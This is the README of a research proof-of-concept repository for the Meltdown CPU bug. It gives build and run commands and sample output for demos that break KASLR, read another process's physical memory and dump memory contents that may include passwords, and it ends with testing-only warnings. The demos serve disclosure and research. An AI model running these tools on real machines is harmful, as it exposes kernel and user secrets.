# Meltdown Proof-of-Concept

This repository contains several applications, demonstrating the [Meltdown bug](https://meltdown.help). For technical information about the bug, refer to the paper: 

* [Meltdown](https://meltdown.help/meltdown.pdf) by Lipp, Schwarz, Gruss, Prescher, Haas, Mangard, Kocher, Genkin, Yarom, and Hamburg

The applications in this repository are built with [libkdump](https://github.com/IAIK/Meltdown/tree/master/libkdump), a library we developed for the paper. This library simplifies exploitation of the bug by automatically adapting to certain properties of the environment. 

## Videos

This repository contains two videos demonstrating Meltdown

 * The [first video (spy)](https://cdn.rawgit.com/IAIK/meltdown/0bc37b5d/videos/spy.mp4) shows how Meltdown can be used to spy in realtime on a password input. 
 * The [second video (memdump)](https://cdn.rawgit.com/IAIK/meltdown/e5793de9/videos/memdump.mp4) shows how Meltdown leaks physical memory content. 
 

## Demos

This repository contains five demos to demonstrate different use cases. All demos are tested on Ubuntu 16.04 with an Intel Core i7-6700K, but they should work on any Linux system with any modern Intel CPU since 2010. 

For best results, we recommend a fast CPU that supports Intel TSX (e.g. any Intel Core i7-5xxx, i7-6xxx, or i7-7xxx). 
Furthermore, every demo should be pinned to one CPU core, e.g. with taskset.

### Build dependency for demos
As a pre-requisite, you need to install glibc-static on your machine.

For RPM-based systems:
```
sudo yum install -y glibc-static
```

### Demo #1: A first test (`test`)

This is the most basic demo. It uses Meltdown to read accessible addresses from the own address space, not breaking any isolation mechanisms. 

If this demo does not work for you, the remaining demos most likely won't work either. The reasons are manifold, e.g., the CPU could be too slow, not support out-of-order execution, the high-resolution timer is not precise enough (especially in VMs), the operating system does not support custom signal handlers, etc.

#### Build and Run

```bash
make
taskset 0x1 ./test
```

If you see an output similar to this
```
Expect: Welcome to the wonderful world of microarchitectural attacks
   Got: Welcome to the wonderful world of microarchitectural attacks
```
then the basic demo works.


### Demo #2: Breaking KASLR (`kaslr`)

Starting with Linux kernel 4.12, KASLR (Kernel Address Space Layout Randomizaton) is active by default.  This means, that the location of the kernel (and also the direct physical map which maps the entire physical memory) changes with each reboot.

This demo uses Meltdown to leak the (secret) randomization of the direct physical map. This demo requires root privileges to speed up the process. The paper describes a variant which does not require root privileges. 

#### Build and Run

```bash
make
sudo taskset 0x1 ./kaslr
```

After a few seconds, you should see something similar to this
```
[+] Direct physical map offset: 0xffff880000000000
```

### Demo #3: Reliability test (`reliability`)

This demo tests how reliable physical memory can be read. For this demo, you either need the direct physical map offset (e.g. from demo #2) or you have to disable KASLR by specifying `nokaslr` in your kernel command line. 

#### Build and Run

Build and start `reliability`. If you have KASLR enabled, the first parameter is the offset of the direct physical map. Otherwise, the program does not require a parameter. 
```bash
make
sudo taskset 0x1 ./reliability 0xffff880000000000
```

After a few seconds, you should get an output similar to this:
```
[-] Success rate: 99.93% (read 1354 values)
```

### Demo #4: Read physical memory (`physical_reader`)

This demo reads memory from a different process by directly reading physical memory. For this demo, you either need the direct physical map offset (e.g. from demo #2) or you have to disable KASLR by specifying `nokaslr` in your kernel command line. 

In principal, this program can read arbitrary physical addresses. However, as the physical memory contains a lot of non-human-readable data, we provide a test tool (`secret`), which puts a human-readable string into memory and directly provides the physical address of this string. 

#### Build and Run

For the demo, first run `secret` (as root) to get the physical address of a human-readable string:
```bash
make
sudo ./secret
```

It should output something like this:
```
[+] Secret: If you can read this, this is really bad
[+] Physical address of secret: 0x390fff400
[+] Exit with Ctrl+C if you are done reading the secret
```

Let the `secret` program running, and start `physical_reader`. The first parameter is the physical address printed by `secret`. If you do not have KASLR disabled,  the second parameter is the offset of the direct physical map.
```bash
taskset 0x1 ./physical_reader 0x390fff400 0xffff880000000000
```

After a few seconds, you should get an output similar to this:
```
[+] Physical address       : 0x390fff400
[+] Physical offset        : 0xffff880000000000
[+] Reading virtual address: 0xffff880390fff400

If you can read this, this is really bad
```


### Demo #5: Dump the memory (`memdump`)

This demo dumps the content of the memory. As demo #3 and #4, it uses the direct physical map, to dump the contents of the physical memory in a hexdump-like format. 

Again, as the physical memory contains a lot of non-human-readable content, we provide a test tool to fill large amounts of the physical memory with human-readable strings. 

#### Build and Run

For the demo, first run `memory_filler` to fill the memory with human-readable strings. The first argument is the amount of memory (in gigabytes) to fill. 
```bash
make
./memory_filler 9
```

Then, run the `memdump` tool to dump memory contents. If you executed `memory_filler` before, you should see some string fragments. 
If you have Firefox or Chrome with multiple tabs running, you might also see parts of the websites which are open or were recently closed. 

The first parameter is the physical address at which the dump should begin (leave empty to start at the first gigabyte). If you do not have KASLR disabled,  the second parameter is the offset of the direct physical map.

```bash
taskset 0x1 ./memdump 0x240000000 0xffff880000000000 # start at 9 GB
```

You should get a hexdump of parts of the memory (potentially even containing secrets such as passwords, see example in the paper), e.g.:

```
 240001c9f: | 00 6d 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | .m.............. |
 24000262f: | 00 7d 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | .}.............. |
 24000271f: | 00 00 00 00 00 00 00 00 00 00 00 00 65 6e 20 75 | ............en u |
 24000272f: | 73 65 72 20 73 70 61 63 65 20 61 6e 64 20 6b 65 | ser space and ke |
 24000273f: | 72 6e 65 6c 57 65 6c 63 6f 6d 65 20 74 6f 20 74 | rnelWelcome to t |
 24000298f: | 00 61 72 79 20 62 65 74 77 65 65 6e 20 75 73 65 | .ary between use |
 24000299f: | 72 20 73 70 61 63 65 20 61 6e 64 20 6b 65 72 6e | r space and kern |
 2400029af: | 65 6c 42 75 72 6e 20 61 66 74 65 72 20 72 65 61 | elBurn after rea |
 2400029bf: | 64 69 6e 67 20 74 68 69 73 20 73 74 72 69 6e 67 | ding this string |
 240002dcf: | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c8 | ................ |
 2400038af: | 6a 75 73 74 20 73 70 69 65 64 20 6f 6e 20 61 00 | just spied on a. |
 240003c8f: | 00 00 1e 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ |
 24000412f: | 00 00 00 00 00 00 00 00 00 00 00 00 65 74 73 2e | ............ets. |
 24000413f: | 2e 2e 57 65 6c 63 6f 6d 65 20 74 6f 20 74 68 65 | ..Welcome to the |
 2400042ff: | 00 00 00 00 00 00 00 00 00 6e 67 72 61 74 75 6c | .........ngratul |
 24000430f: | 61 74 69 6f 6e 73 2c 20 79 6f 75 20 6a 75 73 74 | ations, you just |
 24000431f: | 20 73 70 69 65 64 20 6f 6e 20 61 6e 20 61 70 70 |  spied on an app |
```


## Warnings
**Warning #1**: We are providing this code as-is. You are responsible for protecting yourself, your property and data, and others from any risks caused by this code. This code may cause unexpected and undesirable behavior to occur on your machine. This code may not detect the vulnerability on your machine.

**Warning #2**: If you find that a computer is susceptible to the Meltdown bug, you may want to avoid using it as a multi-user system. Meltdown breaches the CPU's memory protection. On a machine that is susceptible to the Meltdown bug, one process can read all pages used by other processes or by the kernel.

**Warning #3**: This code is only for testing purposes. Do not run it on any productive systems. Do not run it on any system that might be used by another person or entity.
